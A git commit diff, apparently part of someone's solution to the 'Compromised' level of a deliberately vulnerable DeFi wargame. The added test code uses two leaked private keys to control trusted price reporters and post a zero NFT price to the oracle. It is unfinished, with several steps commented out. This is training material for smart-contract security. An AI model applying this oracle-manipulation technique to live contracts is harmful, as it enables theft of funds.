25ca8ae12b51298b4fb9af5d718084187d595e50
Ping-Jui Liao <pingjuiliao@gmail.com>
2022-11-08 20:45:59 -0800

    puppet-v1 finished

--- test/compromised/compromised.challenge.js
+++ test/compromised/compromised.challenge.js
@@ -59,23 +59,37 @@ describe('Compromised challenge', function () {
         this.nftToken = await DamnValuableNFTFactory.attach(await this.exchange.token());
     });
 
-    it('Exploit', async function () {        
+    it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+        leaked_key_a = "0x4d48686a4e6a63345a575978595745304e545a6b59545931597a5a6d597a55344e6a466b4e4451344f544a6a5a475a68597a426a4e6d4d34597a49314e6a42695a6a426a4f575a69593252685a544a6d4e44637a4e574535"
+        leaked_key_b = "0x4d4867794d4467794e444a6a4e4442685932526d59546c6c5a4467344f5755324f44566a4d6a4d314e44646859324a6c5a446c695a575a6a4e6a417a4e7a466c4f5467334e575a69593251334d7a597a4e444269596a5134";
+        seller_a = new ethers.Wallet(leaked_key_a, attacker.provider);
+        seller_b = new ethers.Wallet(leaked_key_b, attacker.provider);
+        /*await attacker.sendTransaction({
+            to: seller_a.address,
+            value: 0x45785d8a0000});*/
+        await this.oracle.connect(seller_a).postPrice("DVNFT", 0);
+        /*await this.oracle.connect(seller_b).postPrice("DVNFT", 0);
+        */
+        // await this.oracle.connect(attacker).postPrice("DVNFT", 0);
+        expect(
+            await this.oracle.getMedianPrice("DVNFT")
+        ).to.eq(0);
     });
 
     after(async function () {
         /** SUCCESS CONDITIONS */
-        
+
         // Exchange must have lost all ETH
         expect(
             await ethers.provider.getBalance(this.exchange.address)
         ).to.be.eq('0');
-        
+
         // Attacker's ETH balance must have significantly increased
         expect(
             await ethers.provider.getBalance(attacker.address)
         ).to.be.gt(EXCHANGE_INITIAL_ETH_BALANCE);
-        
+
         // Attacker must not own any NFT
         expect(
             await this.nftToken.balanceOf(attacker.address)
